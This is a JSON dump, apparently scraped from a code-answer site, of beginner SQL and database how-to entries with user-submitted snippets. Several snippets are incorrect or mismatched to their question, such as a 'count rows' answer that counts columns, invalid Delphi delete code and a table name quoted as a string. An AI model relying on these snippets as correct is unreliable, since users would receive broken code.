    "keyword": null,
    "link": null,
    "title": " how to connect mysql database in jupyter notebook",
    "description": "# In the python cmd, install packages: pip3 install pymysql pip3 install ipython-sql pip3 install mysqlclient  # in the jupyter notebook: import pymysql import pandas as pd  conn=pymysql.connect(host='localhost',port=int(3306),user='root',passwd='YOUR_PASSWORD',db='YOUR_DATABASENAME')  df=pd.read_sql_query(\"SELECT * FROM 'YOUR_TABLENAME' \",conn)  print(df)\n# %% %load_ext sql  # %% %sql mysql+mysqldb://<user>:<password>@localhost/<dataBase>  # %% %%sql  SELECT * FROM <table>;\n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1265,
    "keyword": null,
    "link": null,
    "title": " how to connect mysql local server",
    "description": "",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1266,
    "keyword": null,
    "link": null,
    "title": " how to connect python to sql server",
    "description": "import pyodbc  # Some other example server values are # server = 'localhost\\sqlexpress' # for a named instance # server = 'myserver,port' # to specify an alternate port server = 'tcp:myserver.database.windows.net'  database = 'mydb'  username = 'myusername'  password = 'mypassword'  cnxn = pyodbc.connect('DRIVER={ODBC Driver 17 for SQL Server};SERVER='+server+';DATABASE='+database+';UID='+username+';PWD='+ password) cursor = cnxn.cursor()  #Sample select query cursor.execute(\"SELECT @@version;\")  row = cursor.fetchone()  while row:      print(row[0])     row = cursor.fetchone()\n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1267,
    "keyword": null,
    "link": null,
    "title": " how to connect sql server using ip address in c#",
    "description": "Data Source=127.2.3.4\\SQLEXPRESS,1433;Network Library=DBMSSOCN;Initial Catalog=dbase;User ID=sa;Password=password \n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1268,
    "keyword": null,
    "link": null,
    "title": " how to connect to datbase in springboot",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1269,
    "keyword": null,
    "link": null,
    "title": " how to connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)",
    "description": "#/usr/sbin/mysqld --defaults-file=/etc/mysql/my.cnf --basedir=/usr --datadir=/var/lib/mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock \n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1270,
    "keyword": null,
    "link": null,
    "title": " how to connect to mysql database in python",
    "description": "import mysql.connector  cnx = mysql.connector.connect(user='scott', password='password',                               host='127.0.0.1',                               database='employees') cnx.close()\nimport mysql.connector mydb = mysql.connector.connect(   host=\"localhost\",   user=\"yourusername\",   password=\"yourpassword\",   port = 8888, #for Mamp users   database='whatever db you want' ) print(mydb) \nfrom sqlalchemy import types, create_engine import pymysql  try: \tconn = create_engine('mysql+pymysql://user:pass@IP/database_name')   \tprint(\"MySQL Connection Sucessfull!!!!!!!!!!!\")  except Exception as err:  \tprint(\"MySQL Connection Failed !!!!!!!!!!!\") \tprint(err) \n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1271,
    "keyword": null,
    "link": null,
    "title": " how to connect to the database as root user in linux",
    "description": "GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' IDENTIFIED BY 'password';\n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1272,
    "keyword": null,
    "link": null,
    "title": " how to connect to xampp sql server on windows cmd",
    "description": "cd c:\\xampp\\mysql\\bin mysql.exe -u root --password\n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1273,
    "keyword": null,
    "link": null,
    "title": " how to convert number to hours and minutes in oracle sql",
    "description": "WITH c AS (SELECT 492 AS MINUTES FROM DUAL) SELECT trim(to_char(trunc(MINUTES / 60), '09')) || ':' ||        trim(to_char(trunc(mod(abs(MINUTES), 60)), '09')) AS HHMM FROM c;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t-- 08:12\n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1274,
    "keyword": null,
    "link": null,
    "title": " how to copy data in sql",
    "description": "INSERT INTO my_table my SELECT * FROM another_table an WHERE an.col1 > 10;  INSERT INTO my_table (colA, colB)  SELECT an.col1 AS colA, an.col2 AS colB FROM another_table an WHERE an.col1 > 10;\nINSERT INTO dbo.YourTableNameHere    SELECT *    FROM [SourceServer].[SourceDatabase].dbo.YourTableNameHere\nLet&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:55:43.000Z"
  },
  {
    "id": 1275,
    "keyword": null,
    "link": null,
    "title": " how to copy one table to other one in sql",
    "description": "Let&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1276,
    "keyword": null,
    "link": null,
    "title": " how to count null values in sql",
    "description": "SELECT COUNT(1) FROM my_table WHERE my_column IS NULL;\n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1277,
    "keyword": null,
    "link": null,
    "title": " how to count number of columns in a table in mysql",
    "description": "-- Oracle SELECT count(*) FROM ALL_TAB_COLUMNS WHERE OWNER='owner_name'  \tAND TABLE_NAME = 'table_name'; -- SQL Server / MySQL SELECT count(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'schema_name'  \tAND TABLE_NAME = 'table_name';\n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1278,
    "keyword": null,
    "link": null,
    "title": " how to count number of columns in a table in oracle",
    "description": "-- Oracle SELECT count(*) FROM ALL_TAB_COLUMNS WHERE OWNER='owner_name'  \tAND TABLE_NAME = 'table_name'; -- SQL Server / MySQL SELECT count(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'schema_name'  \tAND TABLE_NAME = 'table_name';\n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1279,
    "keyword": null,
    "link": null,
    "title": " how to count number of columns in a table in sql server",
    "description": "-- Oracle SELECT count(*) FROM ALL_TAB_COLUMNS WHERE OWNER='owner_name'  \tAND TABLE_NAME = 'table_name'; -- SQL Server / MySQL SELECT count(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'schema_name'  \tAND TABLE_NAME = 'table_name';\n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1280,
    "keyword": null,
    "link": null,
    "title": " how to count number of rows in sql",
    "description": "SELECT count(*) FROM information_schema.columns WHERE table_name = 'Your_table_nale'; \n#The COUNT() function returns the number of rows that match specific characteristics. SELECT \tCOUNT(*) FROM \tdatabase_name.table_name\nSELECT COUNT(*) FROM dbo.bigTransactionHistory; \n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1281,
    "keyword": null,
    "link": null,
    "title": " how to create a database in sqlite",
    "description": "$sqlite3 DatabaseName.db\n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1282,
    "keyword": null,
    "link": null,
    "title": " how to create a new user in postgresql",
    "description": "CREATE DATABASE yourdbname;CREATE USER youruser WITH ENCRYPTED PASSWORD 'yourpass';GRANT ALL PRIVILEGES ON DATABASE yourdbname TO youruser;\n$ sudo -u postgres psqlpsql=# alter user <username> with encrypted password '<password>';\n$ sudo -u postgres createdb <dbname>\n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1283,
    "keyword": null,
    "link": null,
    "title": " how to create a sql database",
    "description": "CREATE DATABASE databasename;\nCREATE TABLE example (     id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,     username VARCHAR(50) NOT NULL UNIQUE,     password VARCHAR(255) NOT NULL,     created_at DATETIME DEFAULT CURRENT_TIMESTAMP  );\nCREATE table songs (   id INTEGER PRIMARY KEY AUTOINCREMENT,   title TEXT,   artist TEXT,   mood TEXT,   duration INTEGER,   released INTEGER); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Bohemian Rhapsody\", \"Queen\", \"epic\", 60, 1975); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Let it go\", \"Idina Menzel\", \"epic\", 227, 2013); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will survive\", \"Gloria Gaynor\", \"epic\", 198, 1978); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Twist and Shout\", \"The Beatles\", \"happy\", 152, 1963); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"La Bamba\", \"Ritchie Valens\", \"happy\", 166, 1958); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will always love you\", \"Whitney Houston\", \"epic\", 273, 1992); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Sweet Caroline\", \"Neil Diamond\", \"happy\", 201, 1969); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Call me maybe\", \"Carly Rae Jepsen\", \"happy\", 193, 2011);    SELECT * FROM songs;\nCreates a new database. Example: Creates a new database named &lsquo;websitesetup&rsquo;. CREATE DATABASE websitesetup;\nSHOW DATABASES;  DROP DATABASE testDB;  USE DatabaseName;    SQL> CREATE TABLE CUSTOMERS(    ID   INT              NOT NULL,    NAME VARCHAR (20)     NOT NULL,    AGE  INT              NOT NULL,    ADDRESS  CHAR (25) ,    SALARY   DECIMAL (18, 2),           PRIMARY KEY (ID) );  DESC CUSTOMERS;\nCreate DATABASE HP; \n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1284,
    "keyword": null,
    "link": null,
    "title": " how to create a table based on another table in mysql",
    "description": "Press CTRL+C to copy CREATE TABLE new_tbl [AS] SELECT * FROM orig_tbl;\n",
    "reg_date": "2021-10-12T09:55:44.000Z"
  },
  {
    "id": 1285,
    "keyword": null,
    "link": null,
    "title": " how to create a table in mysql",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\nCREATE TABLE IF NOT EXISTS tasks (     task_id INT AUTO_INCREMENT PRIMARY KEY,     title VARCHAR(255) NOT NULL,     start_date DATE,     due_date DATE,     status TINYINT NOT NULL,     priority TINYINT NOT NULL,     description TEXT,     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )  ENGINE=INNODB; \ncreate table tutorials_tbl(    tutorial_id INT NOT NULL AUTO_INCREMENT,    tutorial_title VARCHAR(100) NOT NULL,    tutorial_author VARCHAR(40) NOT NULL,    submission_date DATE,    PRIMARY KEY ( tutorial_id ) ); \n# updated dec 2020 # Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\ncreate table tutorials_tbl(    tutorial_id INT NOT NULL AUTO_INCREMENT,    tutorial_title VARCHAR(100) NOT NULL,    tutorial_author VARCHAR(40) NOT NULL,    submission_date DATE,    PRIMARY KEY ( tutorial_id ) );\n-- 'CREATE TABLE' followed by the name of the table.  -- In round brackets, define the columns. CREATE TABLE `test_table`  (   id INT(10) PRIMARY KEY,\t\t\t   username VARCHAR(50) NOT NULL );\n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1286,
    "keyword": null,
    "link": null,
    "title": " how to create a table in sql",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\n# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE table_name(   \tid INT AUTO_INCREMENT PRIMARY KEY,     \tname VARCHAR(255), # String 255 chars max   \tdate DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,   \tlongtext BLOB );\n//to create a table CREATE TABLE students ( student_id number(4) primary key,   last_name varchar2(30) NOT NULL,   course_id number(4) NULL );  //to insert value INSERT INTO students VALUES (200, 'Jones', 101); INSERT INTO students VALUES (201, 'Smith', 101); INSERT INTO students VALUE (202, 'Lee' , 102);\n CREATE TABLE Persons ( PersonID int, LastName varchar(255), FirstName varchar(255), Address varchar(255),  City varchar(255)  );  \nCREATE TABLE Persons (     PersonID int,     LastName varchar(255),     FirstName varchar(255),     Address varchar(255),     City varchar(255) );\n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1287,
    "keyword": null,
    "link": null,
    "title": " how to create a table structure from another table in mysql",
    "description": "CREATE TABLE new_tbl LIKE orig_tbl;  //(creates an empty table only definition is                                         same.)\nCREATE TABLE artists_and_works   SELECT artist.name, COUNT(work.artist_id) AS number_of_works   FROM artist LEFT JOIN work ON artist.id = work.artist_id   GROUP BY artist.id;\nPress CTRL+C to copy CREATE TABLE new_tbl [AS] SELECT * FROM orig_tbl;\n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1288,
    "keyword": null,
    "link": null,
    "title": " how to create a variable in mysql",
    "description": "-- MySQL  SET @variable_name := value;\nSET start = 1; SET finish = 10;  SELECT * FROM places WHERE place BETWEEN start AND finish;\n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1289,
    "keyword": null,
    "link": null,
    "title": " how to create database using cmd mysql",
    "description": "CREATE DATABASE [IF NOT EXISTS] database_name [CHARACTER SET charset_name] [COLLATE collation_name] \n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1290,
    "keyword": null,
    "link": null,
    "title": " how to create date column in page using command prompt",
    "description": "mysql> create table DemoTable    (    StudentId int NOT NULL AUTO_INCREMENT PRIMARY KEY,    StudentName varchar(20),    StudentAdmissionDate DATE    ); Query OK, 0 rows affected (0.47 sec)\n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1291,
    "keyword": null,
    "link": null,
    "title": " how to create index mysql",
    "description": "# index_name will identify your index for future reference CREATE INDEX index_name ON table_name (column_name);\ncreate index your_index_name on your_table_name(your_column_name) using HASH; or create index your_index_name on your_table_name(your_column_name) using BTREE;\n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1292,
    "keyword": null,
    "link": null,
    "title": " how to create nested table in sql",
    "description": "CREATE OR REPLACE TYPE my_tab_t AS TABLE OF VARCHAR2(30); / CREATE TABLE nested_table (id NUMBER, col1 my_tab_t)        NESTED TABLE col1 STORE AS col1_tab; \n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1293,
    "keyword": null,
    "link": null,
    "title": " how to create new database user",
    "description": "GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; \nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; \n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1294,
    "keyword": null,
    "link": null,
    "title": " how to create new user and database postgresql in ubuntu",
    "description": "CREATE DATABASE yourdbname;CREATE USER youruser WITH ENCRYPTED PASSWORD 'yourpass';GRANT ALL PRIVILEGES ON DATABASE yourdbname TO youruser;\n$ sudo -u postgres createuser <username>\n$ sudo -u postgres psqlpsql=# alter user <username> with encrypted password '<password>';\n$ sudo -u postgres createdb <dbname>\n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1295,
    "keyword": null,
    "link": null,
    "title": " how to create notes in mysql",
    "description": "-- comment goes here\n/* comment goes here */\n",
    "reg_date": "2021-10-12T09:55:45.000Z"
  },
  {
    "id": 1296,
    "keyword": null,
    "link": null,
    "title": " how to create sql database",
    "description": "CREATE DATABASE databasename;\nCREATE TABLE example (     id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,     username VARCHAR(50) NOT NULL UNIQUE,     password VARCHAR(255) NOT NULL,     created_at DATETIME DEFAULT CURRENT_TIMESTAMP  );\nCREATE table songs (   id INTEGER PRIMARY KEY AUTOINCREMENT,   title TEXT,   artist TEXT,   mood TEXT,   duration INTEGER,   released INTEGER); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Bohemian Rhapsody\", \"Queen\", \"epic\", 60, 1975); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Let it go\", \"Idina Menzel\", \"epic\", 227, 2013); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will survive\", \"Gloria Gaynor\", \"epic\", 198, 1978); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Twist and Shout\", \"The Beatles\", \"happy\", 152, 1963); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"La Bamba\", \"Ritchie Valens\", \"happy\", 166, 1958); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will always love you\", \"Whitney Houston\", \"epic\", 273, 1992); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Sweet Caroline\", \"Neil Diamond\", \"happy\", 201, 1969); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Call me maybe\", \"Carly Rae Jepsen\", \"happy\", 193, 2011);    SELECT * FROM songs;\nCreates a new database. Example: Creates a new database named &lsquo;websitesetup&rsquo;. CREATE DATABASE websitesetup;\n#TO Create a DB : CREATE DATABASE <DB_NAME>; #example : CREATE DATABASE MyDataBase ; #To Create a Table : CREATE TABLE <TB_NAME>(     <Elem 0> <Type_of_Elem created> <ADD_PROPRETIES>, #Don't forget the comma   \t...   \t...   \t...     <Elem n> <Type_of_Elem created> #last elems don't need a comma  ); /*example : CREATE TABLE city (     id int  NOT NULL IDENTITY(1, 1),     city_name char(128)  NOT NULL,     lat decimal(9,6)  NOT NULL,     long decimal(9,6)  NOT NULL,     country_id int  NOT NULL,     CONSTRAINT city_pk PRIMARY KEY  (id) ); */ \nCreate DATABASE HP; \n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1297,
    "keyword": null,
    "link": null,
    "title": " how to create system versioned table in sql server",
    "description": "CREATE TABLE Department (     DeptID INT NOT NULL PRIMARY KEY CLUSTERED   , DeptName VARCHAR(50) NOT NULL   , ManagerID INT NULL   , ParentDeptID INT NULL   , SysStartTime DATETIME2 GENERATED ALWAYS AS ROW START NOT NULL   , SysEndTime DATETIME2 GENERATED ALWAYS AS ROW END NOT NULL   , PERIOD FOR SYSTEM_TIME (SysStartTime,SysEndTime) ) WITH (SYSTEM_VERSIONING = ON); \n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1298,
    "keyword": null,
    "link": null,
    "title": " how to create table in sql",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\n# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE table_name ( column1 TYPE [COLUMN CONSTRAINTS], column2 TYPE [COLUMN CONSTRAINTS], column3 TYPE [COLUMN CONSTRAINTS], [TABLE CONSTRAINTS...] );\nCREATE TABLE table_name(   \tid INT AUTO_INCREMENT PRIMARY KEY,     \tname VARCHAR(255), # String 255 chars max   \tdate DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,   \tlongtext BLOB );\n//to create a table CREATE TABLE students ( student_id number(4) primary key,   last_name varchar2(30) NOT NULL,   course_id number(4) NULL );  //to insert value INSERT INTO students VALUES (200, 'Jones', 101); INSERT INTO students VALUES (201, 'Smith', 101); INSERT INTO students VALUE (202, 'Lee' , 102);\n CREATE TABLE Persons ( PersonID int, LastName varchar(255), FirstName varchar(255), Address varchar(255),  City varchar(255)  );  \n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1299,
    "keyword": null,
    "link": null,
    "title": " how to declare a variable in sql",
    "description": "-- Declare the variable to be used. DECLARE @MyCounter int;  -- Initialize the variable. SET @MyCounter = 0;\nDECLARE @TABLE TABLE( COL1 INT, COL2 VARCHAR(30))\nDECLARE @COURSE_ID AS INT, @COURSE_NAME VARCHAR (10); \nDECLARE  { @LOCAL_VARIABLE[AS] data_type  [ = value ] } \nOne way of doing this is to use database variables  create table testcalc (    id int(11) not null auto_increment,    num1 int(11) default null,    num2 int(11) default null,    num3 int(11) default null,    num4 int(11) default null,    primary key(id) );  insert into testcalc values (default, 1, 2, 3, 4), (default, 5, 10, 15, 20); Then you can get the same results as in your example by storing the calculation results in variable syntax like this  @youVar := (calc) as resultName01 Then it will be available to following calculations to use like this  (@youVar + newCalc) as resultName02 We can apply it to your example like this  select    id,    num1,    num2,    num3,    num4,    @1plus2 := (num1 + num2) as 1plus2,                   # create var01    @1plus2mult3 := (@1plus2 * num3) as 1plus2mult3,      # create var02 using var01    @sumOfCalc := (@1plus2 + @1plus2mult3) as sumOfCalc   # create var03 using var01 and var02 from testcalc;\n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1300,
    "keyword": null,
    "link": null,
    "title": " how to define a composite primary key in sql",
    "description": "CREATE TABLE person(id INT,  \t\t\t\t\tname TEXT, \t\t\t\t\tPRIMARY KEY (id, name) \t\t\t\t   );\n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1301,
    "keyword": null,
    "link": null,
    "title": " how to define a save method in ruby for sql databases",
    "description": "def save     sql = <<-SQL       INSERT INTO songs (name, album)        VALUES (?, ?)     SQL       DB[:conn].execute(sql, self.name, self.album)       @id = DB[:conn].execute(\"SELECT last_insert_rowid() FROM songs\")[0][0]     end\n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1302,
    "keyword": null,
    "link": null,
    "title": " how to define a save method in ruby for sqlite3 databases",
    "description": "def save     sql = <<-SQL       INSERT INTO songs (name, album)        VALUES (?, ?)     SQL       DB[:conn].execute(sql, self.name, self.album)       @id = DB[:conn].execute(\"SELECT last_insert_rowid() FROM songs\")[0][0]     end\n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1303,
    "keyword": null,
    "link": null,
    "title": " how to delay stored procedure execution in sql server",
    "description": "How to delay the execution of the stored procedure in SQL SERVER The code below will delay the execution for 2hrs.  BEGIN       WAITFOR DELAY '02:00';       EXECUTE sp_helpdb;   END;   GO \n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1304,
    "keyword": null,
    "link": null,
    "title": " how to delete a procedure in sql",
    "description": "DROP PROCEDURE <stored procedure name>;   GO   \n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1305,
    "keyword": null,
    "link": null,
    "title": " how to delete a table data in sql",
    "description": "DELETE FROM table_name; //will delete the table data without affecting the table structue\n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1306,
    "keyword": null,
    "link": null,
    "title": " how to delete a table entry in mysql",
    "description": "DELETE FROM `table_name` [WHERE condition];\n-- 'DROP TABLE' followed by the name of the table you would like -- to drop. DROP TABLE `test_table`;\ndelete table query  DROP TABLE <table name; e.g. DROP TABLE students;\n",
    "reg_date": "2021-10-12T09:55:46.000Z"
  },
  {
    "id": 1307,
    "keyword": null,
    "link": null,
    "title": " how to delete a table in mysql",
    "description": "DROP TABLE table_name;\nDELETE FROM `table_name` [WHERE condition];\n-- 'DROP TABLE' followed by the name of the table you would like -- to drop. DROP TABLE `test_table`;\nDROP TABLE tablename;\ndelete table query  DROP TABLE <table name; e.g. DROP TABLE students;\nTo remove existing tables, you use the MySQL DROP TABLE statement.  Here is the basic syntax of the DROP TABLE statement:  DROP [TEMPORARY] TABLE [IF EXISTS] table_name [, table_name] ... [RESTRICT | CASCADE] The DROP TABLE statement removes a table and its data permanently from the database. In MySQL, you can also remove multiple tables using a single DROP TABLE statement, each table is separated by a comma (,).  The TEMPORARY option allows you to remove temporary tables only. It ensures that you do not accidentally remove non-temporary tables.  The IF EXISTS option conditionally drop a table only if it exists. If you drop a non-existing table with the IF EXISTS option, MySQL generates a NOTE, which can be retrieved using the SHOW WARNINGS statement.  Note that the DROP TABLE statement only drops tables. It doesn&rsquo;t remove specific user privileges associated with the tables. Therefore, if you create a table with the same name as the dropped one, MySQL will apply the existing privileges to the new table, which may pose a security risk.  The RESTRICT and CASCADE  options are reserved for the future versions of MySQL.\n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1308,
    "keyword": null,
    "link": null,
    "title": " how to delete all duplicate items in mysql",
    "description": "DELETE FROM FriendsData WHERE fID         NOT IN ( SELECT fID FROM FriendsData                     GROUP BY UserID, FriendsUserID, IsSpecial, CreatedBy) \n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1309,
    "keyword": null,
    "link": null,
    "title": " how to delete all the rows in a table without deleting the table in mysql",
    "description": "delete from tableName; \n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1310,
    "keyword": null,
    "link": null,
    "title": " how to delete columns in sql",
    "description": "ALTER TABLE tableName DROP COLUMN columnName;\n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1311,
    "keyword": null,
    "link": null,
    "title": " how to delete data from database in php",
    "description": "TRUNCATE TABLE [table_name]\n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1312,
    "keyword": null,
    "link": null,
    "title": " how to delete data from sql database in android",
    "description": "db.delete(\"tablename\",\"id=? and name=?\",new String[]{\"1\",\"jack\"});\n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1313,
    "keyword": null,
    "link": null,
    "title": " how to delete database in mysql",
    "description": " DROP DATABASE dbname;\nDROP DATABASE ma_base\nDROP DATABASE dbname\nmysql> drop database `my-database`; \nDROP DATABASE databasename\nDROP DATABASE databasename  TO DELETE DATABASE\n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1314,
    "keyword": null,
    "link": null,
    "title": " how to delete duplicate rows in oracle",
    "description": "DELETE FROM your_table WHERE rowid not in (SELECT MIN(rowid) FROM your_table GROUP BY column1, column2, column3); \n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1315,
    "keyword": null,
    "link": null,
    "title": " how to delete git repo locally",
    "description": "$ rm -rf .git   to delete git repository from local repo (from machine)\ngit rm -rf git\n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1316,
    "keyword": null,
    "link": null,
    "title": " how to delete multiple rows in sql",
    "description": "DELETE FROM employees WHERE last_name = 'Johnson' AND employee_id >= 80;\nDELETE projects, images  FROM projects, images  WHERE projects.p_id = ?  AND projects.p_id = images.p_id; \n// in order to do such use between keyword  delete from students where id between 6 and 10\n",
    "reg_date": "2021-10-12T09:55:47.000Z"
  },
  {
    "id": 1317,
    "keyword": null,
    "link": null,
    "title": " how to delete record sql delphi",
    "description": "qry.sql.clear; qry.sql('DELETE FROM'); qry.sql('WHERE'); execSQL; FormShow(Self);\n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1318,
    "keyword": null,
    "link": null,
    "title": " how to delete row in sql",
    "description": "delete from TableName where condition; delete from scrumteam where firstname='Jack'; delete from scrumteam where JobTitle='SDET';\n-- Deletes all records where `columnName` matches the values in brackets. DELETE FROM tableName WHERE columnName IN ('val1', 'val2', 'val3');\nDELETE FROM my_table;\t\t-- all rows DELETE FROM my_table WHERE my_id = 12345; DELETE FROM my_table WHERE my_id IN (SELECT id2 FROM my_table2);\n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1319,
    "keyword": null,
    "link": null,
    "title": " how to delete table in mysql",
